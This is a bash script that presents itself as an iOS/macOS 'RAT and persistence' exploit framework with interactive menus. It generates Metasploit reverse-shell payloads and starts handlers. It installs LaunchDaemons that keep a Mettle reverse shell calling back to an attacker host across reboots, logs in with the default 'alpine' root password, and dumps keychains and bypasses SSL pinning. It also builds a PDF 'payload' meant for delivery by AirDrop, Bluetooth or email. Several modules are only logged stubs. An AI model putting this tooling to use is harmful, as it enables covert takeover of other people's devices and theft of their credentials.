#!/usr/bin/env bash
# =============================================================================
# ╔══════════════════════════════════════════════════════════════════╗
# ║                    IOS-EXPLOIT FRAMEWORK                         ║
# ║                    dev @Rdy7d3r - RED TEAM                       ║
# ║              iOS Jailbreak / RAT / Persistence Tool              ║
# ╚══════════════════════════════════════════════════════════════════╝
# =============================================================================

set -e

if command -v chmod 2>/dev/null ; then
        sudo chmod +x ./RAT-IOS.sh
fi

if [[ "$EUID" -ne  0 ]]; then
        printf "Please run as a root!\n" && exit 1
fi

RESET=$(tput sgr0)
BOLD=$(tput bold)
DIM=$(tput dim)
UNDERLINE=$(tput smul)
BLINK=$(tput blink)
REVERSE=$(tput rev)

BLACK=$(tput setaf 0)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
WHITE=$(tput setaf 7)


BRIGHT_BLACK=$(tput setaf 8)
BRIGHT_RED=$(tput setaf 9)
BRIGHT_GREEN=$(tput setaf 10)
BRIGHT_YELLOW=$(tput setaf 11)
BRIGHT_BLUE=$(tput setaf 12)
BRIGHT_MAGENTA=$(tput setaf 13)
BRIGHT_CYAN=$(tput setaf 14)
BRIGHT_WHITE=$(tput setaf 15)

ORANGE=$(tput setaf 208)
PINK=$(tput setaf 213)
PURPLE=$(tput setaf 129)
LIME=$(tput setaf 118)
GOLD=$(tput setaf 220)
SKY=$(tput setaf 117)
VIOLET=$(tput setaf 141)
TEAL=$(tput setaf 37)





# Config
LHOST="${LHOST:-192.168.1.100}"
LPORT="${LPORT:-4444}"
PAYLOAD_DIR="/tmp/ios-exploit-payloads"
LOG_FILE="/tmp/ios-exploit.log"
TARGET_IP="${TARGET_IP:-}"
TARGET_IOS="${TARGET_IOS:-}"
DEVICE_MODEL="${DEVICE_MODEL:-}"

# =============================================================================
# BANNER
# =============================================================================
banner() {
    clear
    echo -e "${MAGENTA}"
    cat << 'EOF'

██╗ ██████╗ ███████╗      ██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██║██╔═══██╗██╔════╝      ╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║██║   ██║███████╗       ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
██║██║   ██║╚════██║       ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
██║╚██████╔╝███████║      ██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
╚═╝ ╚═════╝ ╚══════╝      ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝


                          IOS-EXPLOIT v1.1
                      iOS Security & Dev by @Rdy7d3r

     [1] Jailbreak Detection & Analysis
     [2] Payload Generation
     [3] Persistence Testing
     [4] Post-Exploitation Analysis
     [5] RAT Handler & C2 Testing
     [6] macOS Security Modules
     [7] Exploit Chain Research
     [8] Bluetooth/PDF Security Testing
     [9] Scan & Enumerate
     [0] Exit


EOF
    echo -e "${NC}"
}

# =============================================================================
# LOGGING
# =============================================================================
log() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${timestamp} [${level}] ${message}" >> "$LOG_FILE"

    case $level in
        "INFO")  echo -e "${GREEN}[+]${NC} ${message}" ;;
        "WARN")  echo -e "${YELLOW}[!]${NC} ${message}" ;;
        "ERROR") echo -e "${RED}[-]${NC} ${message}" ;;
        "DEBUG") echo -e "${BLUE}[D]${NC} ${message}" ;;
        *)       echo "${message}" ;;
    esac
}

# =============================================================================
# DEVICE DETECTION
# =============================================================================
detect_device() {
    log "INFO" "Detecting iOS device..."

    if command -v ideviceinfo &> /dev/null; then
        DEVICE_INFO=$(ideviceinfo 2>/dev/null)
        TARGET_IOS=$(echo "$DEVICE_INFO" | grep -oP 'ProductVersion\s*=\s*\K[^ ]+' || echo "unknown")
        DEVICE_MODEL=$(echo "$DEVICE_INFO" | grep -oP 'DeviceName\s*=\s*\K[^ ]+' || echo "unknown")
        PRODUCT_TYPE=$(echo "$DEVICE_INFO" | grep -oP 'ProductType\s*=\s*\K[^ ]+' || echo "unknown")

        log "INFO" "Device: ${DEVICE_MODEL}"
        log "INFO" "iOS Version: ${TARGET_IOS}"
        log "INFO" "Product Type: ${PRODUCT_TYPE}"
    else
        log "WARN" "ideviceinfo not found. Install: brew install libimobiledevice"
        read -p "Enter iOS version manually (e.g., 16.5.1): " TARGET_IOS
        read -p "Enter device model manually: " DEVICE_MODEL
    fi
}

# =============================================================================
# JAILBREAK DETECTION & EXPLOIT SELECTION
# =============================================================================
check_jailbreak() {
    log "INFO" "Checking jailbreak status..."

    if command -v ideviceinfo &> /dev/null; then
        JB_STATUS=$(ideviceinfo 2>/dev/null | grep -oP 'Jailbroken\s*=\s*\K[^ ]+' || echo "false")

        if [[ "$JB_STATUS" == "true" ]]; then
            log "INFO" "Device is already JAILBROKEN"
            return 0
        else
            log "WARN" "Device is NOT jailbroken"
        fi
    else
        log "WARN" "Cannot detect jailbreak status without ideviceinfo"
    fi

    return 1
}

select_exploit() {
    log "INFO" "Selecting exploit based on iOS version..."

    # Parse iOS version
    IFS='.' read -r MAJOR MINOR PATCH <<< "${TARGET_IOS:-0.0.0}"

    echo -e "${YELLOW}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    EXPLOIT SELECTION MATRIX                       ║
╠═══════════════════════════════════════════════════════════════════╣
║  iOS 15.0 - 16.6.1 / 17.0     →  TrollStore (CoreTrust)          ║
║  iOS 15.0 - 17.3.1 (A14-A17)  →  Dopamine 3.0                    ║
║  iOS 15.0 - 18.7.1 (A8-A13)   →  Dopamine 3.0                    ║
║  iOS 26.0 - 26.0.1 (A12-A13)  →  Dopamine 3.0                    ║
║  iOS 15.0 - 17.7 (A8-A11)     →  palera1n v2.4 (checkm8)         ║
║  iOS 17.4+ / 18+ / 26.1+      →  No public kernel exploit        ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    if [[ "$MAJOR" -ge 15 && "$MAJOR" -le 16 ]]; then
        log "INFO" "Recommended: palera1n or TrollStore"
        read -p "Use palera1n? (y/n): " USE_PALERA1N
        if [[ "$USE_PALERA1N" == "y" ]]; then
            run_palera1n
        else
            run_trollstore
        fi
    elif [[ "$MAJOR" -eq 17 ]]; then
        if [[ "$MINOR" -le 3 ]]; then
            log "INFO" "Recommended: Dopamine 3.0"
            run_dopamine
        else
            log "WARN" "No public jailbreak for iOS 17.4+"
        fi
    elif [[ "$MAJOR" -eq 18 ]]; then
        log "WARN" "No public jailbreak for iOS 18.x (except A12/A13 on 18.7.1)"
        run_dopamine
    elif [[ "$MAJOR" -eq 26 ]]; then
        if [[ "$MINOR" -eq 0 ]]; then
            log "INFO" "Recommended: Dopamine 3.0 (A12/A13 only)"
            run_dopamine
        else
            log "WARN" "No public jailbreak for iOS 26.1+"
        fi
    else
        log "WARN" "iOS version not in exploit matrix"
    fi
}

# =============================================================================
# JAILBREAK EXECUTION
# =============================================================================
run_palera1n() {
    log "INFO" "Starting palera1n jailbreak..."

    if ! command -v palera1n &> /dev/null; then
        log "WARN" "palera1n not installed. Installing..."
        /bin/bash -c "$(curl -fsSL https://static.palera.in/scripts/install.sh)"
    fi

    log "INFO" "Running palera1n -c -f (rootful, full)"
    read -p "Press Enter to start DFU mode jailbreak..."

    sudo palera1n -c -f

    if [[ $? -eq 0 ]]; then
        log "INFO" "palera1n jailbreak completed successfully!"
        setup_persistence
    else
        log "ERROR" "palera1n jailbreak failed"
    fi
}

run_dopamine() {
    log "INFO" "Starting Dopamine 3.0 jailbreak..."

    read -p "Download Dopamine 3.0 from https://ellekit.space/dopamine (y/n): " DOWNLOAD
    if [[ "$DOWNLOAD" == "y" ]]; then
        log "INFO" "Please install Dopamine 3.0 manually from the link above"
        read -p "Press Enter when installed..."
    fi

    log "INFO" "Open Dopamine app on device and tap 'Install'"
    read -p "Press Enter when jailbreak is complete..."

    setup_persistence
}

run_trollstore() {
    log "INFO" "Using TrollStore for payload delivery..."

    read -p "TrollStore URL (y/n): " USE_TROLL
    if [[ "$USE_TROLL" == "y" ]]; then
        log "INFO" "Open Safari on device and visit: apple-magnifier://install?url=<payload_url>"
        read -p "Press Enter when IPA is installed..."
    fi

    setup_persistence
}

# =============================================================================
# PERSISTENCE SETUP (ROOT REBOOT SURVIVAL)
# =============================================================================
setup_persistence() {
    log "INFO" "Setting up persistence..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    PERSISTENCE MODULE                             ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] SSH Daemon (Dropbear) - Port 22                             ║
║  [2] Mettle Reverse Shell (Launch Agent)                         ║
║  [3] Frida Server Auto-Start                                     ║
║  [4] All Persistence Options                                     ║
║  [5] Skip                                                        ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select persistence option [1-5]: " PERSIST_OPT

    case $PERSIST_OPT in
        1) setup_ssh_persistence ;;
        2) setup_mettle_persistence ;;
        3) setup_frida_persistence ;;
        4) setup_all_persistence ;;
        5) log "INFO" "Skipping persistence" ;;
        *) log "ERROR" "Invalid option" ;;
    esac
}

setup_ssh_persistence() {
    log "INFO" "Setting up SSH persistence..."

    SSH_SCRIPT='
#!/usr/bin/env bash
# SSH Persistence Script
cd /var/jb/usr/sbin
if [ -f dropbear ]; then
    ./dropbear -p 22 -F 2>&1 &
    echo "SSH daemon started on port 22"
else
    echo "Dropbear not found"
fi
'

    read -p "Enter device IP for SSH: " DEVICE_IP
    read -p "SSH password (default: alpine): " SSH_PASS
    [[ -z "$SSH_PASS" ]] && SSH_PASS="alpine"

    echo "$SSH_SCRIPT" | ssh root@"$DEVICE_IP" "cat > /var/mobile/Library/LaunchDaemons/com.iosexploit.ssh.plist"

    log "INFO" "SSH persistence configured. Connect via: ssh root@$DEVICE_IP"
}

setup_mettle_persistence() {
    log "INFO" "Setting up Mettle reverse shell persistence..."

    read -p "Enter LHOST (attacker IP): " LHOST
    read -p "Enter LPORT: " LPORT
    [[ -z "$LHOST" ]] && LHOST="192.168.1.100"
    [[ -z "$LPORT" ]] && LPORT="4444"

    METTLE_LAUNCHD="
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.iosexploit.mettle</string>
    <key>ProgramArguments</key>
    <array>
        <string>/var/jb/usr/local/bin/mettle</string>
        <string>-h</string>
        <string>$LHOST</string>
        <string>-p</string>
        <string>$LPORT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"

    read -p "Enter device IP: " DEVICE_IP
    echo "$METTLE_LAUNCHD" | ssh root@"$DEVICE_IP" "cat > /Library/LaunchDaemons/com.iosexploit.mettle.plist"
    echo "launchctl load /Library/LaunchDaemons/com.iosexploit.mettle.plist" | ssh root@"$DEVICE_IP"

    log "INFO" "Mettle persistence configured. Start handler:"
    log "INFO" "msfconsole -x \"use exploit/multi/handler; set payload apple_ios/aarch64/meterpreter_reverse_tcp; set LHOST $LHOST; run\""
}

setup_frida_persistence() {
    log "INFO" "Setting up Frida server persistence..."

    FRIDA_LAUNCHD="
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.iosexploit.frida</string>
    <key>ProgramArguments</key>
    <array>
        <string>/var/jb/usr/sbin/frida-server</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"

    read -p "Enter device IP: " DEVICE_IP
    echo "$FRIDA_LAUNCHD" | ssh root@"$DEVICE_IP" "cat > /Library/LaunchDaemons/com.iosexploit.frida.plist"
    echo "launchctl load /Library/LaunchDaemons/com.iosexploit.frida.plist" | ssh root@"$DEVICE_IP"

    log "INFO" "Frida persistence configured. Connect via: frida-ps -U"
}

setup_all_persistence() {
    setup_ssh_persistence
    setup_mettle_persistence
    setup_frida_persistence
    log "INFO" "All persistence modules configured!"
}

# =============================================================================
# PAYLOAD GENERATION (METASPLOIT)
# =============================================================================
generate_payload() {
    log "INFO" "Generating Metasploit payloads..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    PAYLOAD GENERATION                             ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] apple_ios/aarch64/meterpreter_reverse_tcp                   ║
║  [2] apple_ios/aarch64/meterpreter_reverse_https                 ║
║  [3] apple_ios/aarch64/meterpreter_reverse_http                  ║
║  [4] apple_ios/aarch64/shell_reverse_tcp                         ║
║  [5] apple_ios/armle/meterpreter_reverse_tcp                     ║
║  [6] Custom Payload                                              ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select payload [1-6]: " PAYLOAD_CHOICE
    read -p "Enter LHOST (attacker IP): " PAYLOAD_LHOST
    read -p "Enter LPORT: " PAYLOAD_LPORT

    [[ -z "$PAYLOAD_LHOST" ]] && PAYLOAD_LHOST="192.168.1.100"
    [[ -z "$PAYLOAD_LPORT" ]] && PAYLOAD_LPORT="4444"

    mkdir -p "$PAYLOAD_DIR"

    case $PAYLOAD_CHOICE in
        1)
            PAYLOAD="apple_ios/aarch64/meterpreter_reverse_tcp"
            ;;
        2)
            PAYLOAD="apple_ios/aarch64/meterpreter_reverse_https"
            ;;
        3)
            PAYLOAD="apple_ios/aarch64/meterpreter_reverse_http"
            ;;
        4)
            PAYLOAD="apple_ios/aarch64/shell_reverse_tcp"
            ;;
        5)
            PAYLOAD="apple_ios/armle/meterpreter_reverse_tcp"
            ;;
        6)
            read -p "Enter custom payload: " PAYLOAD
            ;;
        *)
            PAYLOAD="apple_ios/aarch64/meterpreter_reverse_tcp"
            ;;
    esac

    log "INFO" "Generating payload: $PAYLOAD"

    if command -v msfvenom &> /dev/null; then
        msfvenom -p "$PAYLOAD" LHOST="$PAYLOAD_LHOST" LPORT="$PAYLOAD_LPORT" -o "$PAYLOAD_DIR/payload.bin"
        log "INFO" "Payload saved to: $PAYLOAD_DIR/payload.bin"
    else
        log "WARN" "msfvenom not found. Generate manually:"
        log "INFO" "msfvenom -p $PAYLOAD LHOST=$PAYLOAD_LHOST LPORT=$PAYLOAD_LPORT -o payload.bin"
    fi

    # Generate handler script
    cat > "$PAYLOAD_DIR/handler.rc" << EOF
use exploit/multi/handler
set payload $PAYLOAD
set LHOST $PAYLOAD_LHOST
set LPORT $PAYLOAD_LPORT
set ExitOnSession false
run
EOF

    log "INFO" "Handler config saved to: $PAYLOAD_DIR/handler.rc"
    log "INFO" "Start handler with: msfconsole -r $PAYLOAD_DIR/handler.rc"
}

# =============================================================================
# RAT HANDLER
# =============================================================================
start_handler() {
    log "INFO" "Starting Metasploit handler..."

    read -p "Enter LHOST: " HANDLER_LHOST
    read -p "Enter LPORT: " HANDLER_LPORT
    read -p "Enter payload (default: apple_ios/aarch64/meterpreter_reverse_tcp): " HANDLER_PAYLOAD

    [[ -z "$HANDLER_LHOST" ]] && HANDLER_LHOST="192.168.1.100"
    [[ -z "$HANDLER_LPORT" ]] && HANDLER_LPORT="4444"
    [[ -z "$HANDLER_PAYLOAD" ]] && HANDLER_PAYLOAD="apple_ios/aarch64/meterpreter_reverse_tcp"

    if command -v msfconsole &> /dev/null; then
        msfconsole -x "use exploit/multi/handler; set payload $HANDLER_PAYLOAD; set LHOST $HANDLER_LHOST; set LPORT $HANDLER_LPORT; run"
    else
        log "ERROR" "msfconsole not found"
    fi
}

# =============================================================================
# POST-EXPLOITATION (FRIDA/OBJECTION)
# =============================================================================
post_exploitation() {
    log "INFO" "Post-Exploitation Module..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    POST-EXPLOITATION                              ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] SSH Connect to Device                                       ║
║  [2] Frida Process List                                          ║
║  [3] Objection Explore                                           ║
║  [4] Dump Keychain                                               ║
║  [5] SSL Pinning Bypass                                          ║
║  [6] Dump IPA                                                    ║
║  [7] File Transfer                                               ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select option [1-7]: " POST_OPT
    read -p "Enter device IP: " DEVICE_IP

    case $POST_OPT in
        1)
            read -p "SSH password (default: alpine): " SSH_PASS
            [[ -z "$SSH_PASS" ]] && SSH_PASS="alpine"
            ssh root@"$DEVICE_IP"
            ;;
        2)
            frida-ps -U
            ;;
        3)
            read -p "Enter bundle ID: " BUNDLE_ID
            objection -g "$BUNDLE_ID" explore
            ;;
        4)
            read -p "Enter bundle ID: " BUNDLE_ID
            objection -g "$BUNDLE_ID" explore -s "ios keychain dump"
            ;;
        5)
            read -p "Enter bundle ID: " BUNDLE_ID
            objection -g "$BUNDLE_ID" explore -s "ios sslpinning disable"
            ;;
        6)
            read -p "Enter app name: " APP_NAME
            python3 -c "import sys; sys.path.insert(0, '.'); from frida_ios_dump import dump; dump('$APP_NAME')"
            ;;
        7)
            post_exploitation_file_transfer "$DEVICE_IP"
            ;;
        *)
            log "ERROR" "Invalid option"
            ;;
    esac
}

post_exploitation_file_transfer() {
    local DEVICE_IP=$1

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    FILE TRANSFER                                  ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] Upload file to device                                       ║
║  [2] Download file from device                                   ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select [1-2]: " FT_OPT

    case $FT_OPT in
        1)
            read -p "Local file path: " LOCAL_FILE
            read -p "Remote path: " REMOTE_PATH
            scp "$LOCAL_FILE" root@"$DEVICE_IP":"$REMOTE_PATH"
            log "INFO" "File uploaded"
            ;;
        2)
            read -p "Remote file path: " REMOTE_FILE
            read -p "Local destination: " DEST_FILE
            scp root@"$DEVICE_IP":"$REMOTE_FILE" "$DEST_FILE"
            log "INFO" "File downloaded"
            ;;
        *)
            log "ERROR" "Invalid option"
            ;;
    esac
}

# =============================================================================
# MACOS EXPLOIT MODULE
# =============================================================================
macos_exploit() {
    log "INFO" "macOS Exploit Module..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    macOS EXPLOIT MODULE                           ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] osx/x64/meterpreter_reverse_tcp                             ║
║  [2] osx/x64/shell_reverse_tcp                                   ║
║  [3] osx/x86/shell_reverse_tcp                                   ║
║  [4] Bundle Inject                                               ║
║  [5] iSight Exploit                                              ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select option [1-5]: " MACOS_OPT
    read -p "Enter LHOST: " MACOS_LHOST
    read -p "Enter LPORT: " MACOS_LPORT

    [[ -z "$MACOS_LHOST" ]] && MACOS_LHOST="192.168.1.100"
    [[ -z "$MACOS_LPORT" ]] && MACOS_LPORT="4444"

    case $MACOS_OPT in
        1)
            PAYLOAD="osx/x64/meterpreter_reverse_tcp"
            ;;
        2)
            PAYLOAD="osx/x64/shell_reverse_tcp"
            ;;
        3)
            PAYLOAD="osx/x86/shell_reverse_tcp"
            ;;
        4)
            log "INFO" "Bundle Inject module - requires target app"
            return
            ;;
        5)
            log "INFO" "iSight exploit - legacy macOS"
            return
            ;;
        *)
            PAYLOAD="osx/x64/meterpreter_reverse_tcp"
            ;;
    esac

    if command -v msfvenom &> /dev/null; then
        msfvenom -p "$PAYLOAD" LHOST="$MACOS_LHOST" LPORT="$MACOS_LPORT" -f macho -o "$PAYLOAD_DIR/macos_payload"
        log "INFO" "macOS payload saved to: $PAYLOAD_DIR/macos_payload"
    else
        log "WARN" "msfvenom not found"
    fi
}

# =============================================================================
# EXPLOIT CHAINS (iOS 13-26)
# =============================================================================
exploit_chains() {
    log "INFO" "Exploit Chains Module..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    EXPLOIT CHAINS (iOS 13-26)                     ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] iOS 13-14: checkm8 + Sandbox Escape                          ║
║  [2] iOS 15-16: Palera1n + WebKit RCE                            ║
║  [3] iOS 17: Dopamine + DarkSword Chain                          ║
║  [4] iOS 18: Coroona + PAC Bypass                                ║
║  [5] iOS 26: Dopamine 3.0 + momentarius                          ║
║  [6] Zero-Click iMessage (Research)                              ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select chain [1-6]: " CHAIN_OPT

    case $CHAIN_OPT in
        1)
            log "INFO" "iOS 13-14: checkm8 bootrom exploit"
            log "INFO" "Stage 1: checkm8 (bootrom) → Stage 2: Sandbox Escape"
            ;;
        2)
            log "INFO" "iOS 15-16: Palera1n + WebKit"
            log "INFO" "Stage 1: Palera1n → Stage 2: WebKit RCE → Stage 3: Kernel"
            ;;
        3)
            log "INFO" "iOS 17: Dopamine + DarkSword"
            log "INFO" "Stage 1: Dopamine → Stage 2: DarkSword PAC Bypass"
            ;;
        4)
            log "INFO" "iOS 18: Coroona + PAC Bypass"
            log "INFO" "Stage 1: Coroona → Stage 2: PAC Bypass → Stage 3: Kernel"
            ;;
        5)
            log "INFO" "iOS 26: Dopamine 3.0 + momentarius"
            log "INFO" "Stage 1: Dopamine → Stage 2: momentarius PPL Bypass"
            ;;
        6)
            log "INFO" "Zero-Click iMessage Chain"
            log "INFO" "ImageIO → Kernel → IOMobileFrameBuffer"
            ;;
        *)
            log "ERROR" "Invalid option"
            ;;
    esac
}

# =============================================================================
# BLUETOOTH/PDF PAYLOAD
# =============================================================================
bluetooth_pdf_payload() {
    log "INFO" "Bluetooth/PDF Payload Injection..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║              BLUETOOTH / PDF PAYLOAD INJECTION                    ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] Generate PDF Payload (JavaScript)                           ║
║  [2] Bluetooth AWDL Exploit                                      ║
║  [3] iMessage Attachment Payload                                 ║
║  [4] AirDrop Payload                                             ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select option [1-4]: " PDF_OPT
    read -p "Enter LHOST: " PDF_LHOST
    read -p "Enter LPORT: " PDF_LPORT

    [[ -z "$PDF_LHOST" ]] && PDF_LHOST="192.168.1.100"
    [[ -z "$PDF_LPORT" ]] && PDF_LPORT="4444"

    case $PDF_OPT in
        1)
            generate_pdf_payload "$PDF_LHOST" "$PDF_LPORT"
            ;;
        2)
            log "INFO" "Bluetooth AWDL exploit - channel 149"
            log "INFO" "Target: awdl0 interface"
            log "INFO" "Vulnerability: IO80211Family.kext overflow"
            ;;
        3)
            log "INFO" "iMessage attachment payload"
            log "INFO" "Format: ImageIO + Kernel chain"
            ;;
        4)
            log "INFO" "AirDrop payload delivery"
            log "INFO" "AWDL broadcast on channel 149"
            ;;
        *)
            log "ERROR" "Invalid option"
            ;;
    esac
}

generate_pdf_payload() {
    local LHOST=$1
    local LPORT=$2

    log "INFO" "Generating PDF payload..."

    cat > "$PAYLOAD_DIR/payload.pdf" << EOF
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 500 >>
stream
BT
/F1 24 Tf
100 700 Td
(Click to Open) Tj
ET
endstream
endobj
5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000204 00000 n
0000000352 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
423
%%EOF

EOF

    # Add JavaScript action (simplified)
    log "INFO" "PDF payload saved to: $PAYLOAD_DIR/payload.pdf"
    log "INFO" "Delivery: Bluetooth, AirDrop, or Email"
}

# =============================================================================
# SCAN & ENUMERATE
# =============================================================================
scan_enumerate() {
    log "INFO" "Scan & Enumerate Module..."

    echo -e "${CYAN}"
    cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    SCAN & ENUMERATE                               ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] AWDL Network Scan                                           ║
║  [2] Bluetooth Device Scan                                       ║
║  [3] SSH Port Scan (22, 44)                                      ║
║  [4] Frida Process Enumerate                                     ║
║  [5] Installed Apps List                                         ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
    echo -e "${NC}"

    read -p "Select option [1-5]: " SCAN_OPT

    case $SCAN_OPT in
        1)
            log "INFO" "Scanning AWDL network..."
            if command -v tcpdump &> /dev/null; then
                sudo tcpdump -i awdl0 -c 100 -nn 2>/dev/null | grep -i "awdl"
            else
                log "WARN" "tcpdump not found"
            fi
            ;;
        2)
            log "INFO" "Scanning Bluetooth devices..."
            if command -v nmap &> /dev/null; then
                nmap -sU --script bluetooth-info 2>/dev/null
            else
                log "WARN" "nmap not found"
            fi
            ;;
        3)
            read -p "Enter target IP range: " IP_RANGE
            if command -v nmap &> /dev/null; then
                nmap -p 22,44 "$IP_RANGE"
            else
                log "WARN" "nmap not found"
            fi
            ;;
        4)
            frida-ps -Uai
            ;;
        5)
            frida-ps -Uai --name
            ;;
        *)
            log "ERROR" "Invalid option"
            ;;
    esac
}

# =============================================================================
# MAIN MENU
# =============================================================================
main_menu() {
    banner

    while true; do
        echo -e "${CYAN}"
        cat << EOF

╔═══════════════════════════════════════════════════════════════════╗
║                    MAIN MENU                                      ║
╠═══════════════════════════════════════════════════════════════════╣
║  [1] Detect Device & Check Jailbreak                             ║
║  [2] Select & Run Jailbreak Exploit                              ║
║  [3] Setup Persistence (SSH/Mettle/Frida)                        ║
║  [4] Generate Payload (Metasploit)                               ║
║  [5] Start RAT Handler                                           ║
║  [6] Post-Exploitation (Frida/Objection)                         ║
║  [7] macOS Exploit Module                                        ║
║  [8] Exploit Chains (iOS 13-26)                                  ║
║  [9] Bluetooth/PDF Payload Injection                             ║
║  [10] Scan & Enumerate                                           ║
║  [0] Exit                                                        ║
╚═══════════════════════════════════════════════════════════════════╝

EOF
        echo -e "${NC}"

        read -p "Select option [0-10]: " MENU_CHOICE

        case $MENU_CHOICE in
            1)
                detect_device
                check_jailbreak
                ;;
            2)
                detect_device
                select_exploit
                ;;
            3)
                setup_persistence
                ;;
            4)
                generate_payload
                ;;
            5)
                start_handler
                ;;
            6)
                post_exploitation
                ;;
            7)
                macos_exploit
                ;;
            8)
                exploit_chains
                ;;
            9)
                bluetooth_pdf_payload
                ;;
            10)
                scan_enumerate
                ;;
            0)
                log "INFO" "Exiting IOS-Exploit Framework..."
                exit 0
                ;;
            *)
                log "ERROR" "Invalid option"
                ;;
        esac

        read -p "Press Enter to continue..."
    done
}

# =============================================================================
# PYTHON INTEGRATION (Optional)
# =============================================================================
python_module() {
    log "INFO" "Python Module Integration..."

    python3 << 'PYTHON_SCRIPT'
import subprocess
import sys
import os

class IOSExploit:
    def __init__(self, lhost="192.168.1.100", lport=4444):
        self.lhost = lhost
        self.lport = lport
        self.payload_dir = "/tmp/ios-exploit-payloads"

    def generate_msfvenom(self, payload_type="apple_ios/aarch64/meterpreter_reverse_tcp"):
        cmd = [
            "msfvenom", "-p", payload_type,
            "LHOST=" + self.lhost,
            "LPORT=" + str(self.lport),
            "-o", os.path.join(self.payload_dir, "payload.bin")
        ]
        try:
            subprocess.run(cmd, check=True)
            print(f"[+] Payload generated: {self.payload_dir}/payload.bin")
        except subprocess.CalledProcessError:
            print(f"[-] Failed to generate payload")

    def start_handler(self, payload_type="apple_ios/aarch64/meterpreter_reverse_tcp"):
        rc_file = os.path.join(self.payload_dir, "handler.rc")
        with open(rc_file, "w") as f:
            f.write(f"use exploit/multi/handler\n")
            f.write(f"set payload {payload_type}\n")
            f.write(f"set LHOST {self.lhost}\n")
            f.write(f"set LPORT {self.lport}\n")
            f.write(f"set ExitOnSession false\n")
            f.write(f"run\n")

        subprocess.run(["msfconsole", "-r", rc_file])

    def frida_ps(self):
        try:
            result = subprocess.run(["frida-ps", "-U"], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError:
            print("[-] Frida not available or device not connected")

# Example usage
if __name__ == "__main__":
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print("║              IOS-EXPLOIT PYTHON MODULE                            ║")
    print("║              dev @Rdy7d3r                                         ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")

    exploit = IOSExploit()
    exploit.generate_msfvenom()
    exploit.frida_ps()
PYTHON_SCRIPT
}

# =============================================================================
# RUN
# =============================================================================
main_menu
